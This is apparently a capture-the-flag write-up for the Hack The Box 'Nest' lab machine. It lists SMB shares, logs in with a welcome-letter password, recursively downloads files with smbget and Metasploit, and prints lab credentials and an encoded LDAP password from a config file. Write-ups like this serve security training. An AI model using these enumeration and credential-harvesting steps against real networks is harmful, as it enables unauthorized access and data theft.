### Listing the shares:
```
$ smbclient  -L //10.10.10.178
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
```



### You can do the following to access the shares:
```
$ smbclient //10.10.10.178/Data
            or            /Users
            or            /C$
            or			 /Secure$
```


### enum 01
```
$ smbclient //10.10.10.178/Users -U TempUser
```

### to download the files use:
`msf > use auxiliary/admin/smb/download_file`

or
`smbget  smb://username:password@ip/<share>/<path to file or folder>`
-R argument for folders

some interesting files contain the following:

#### file 01
```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019
```

#### file 02
```
<File filename="C:\windows\System32\drivers\etc\hosts"/>
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt"/>
<File filename="C:\Users\C.Smith\Desktop\todo.txt"/>
```


#### file 03

```
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="ht>
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```



#### more enumeration 02

```
smbget -R smb://TempUser:welcome2019@10.10.10.178/Secure$/IT/Carl/
```
to download all files
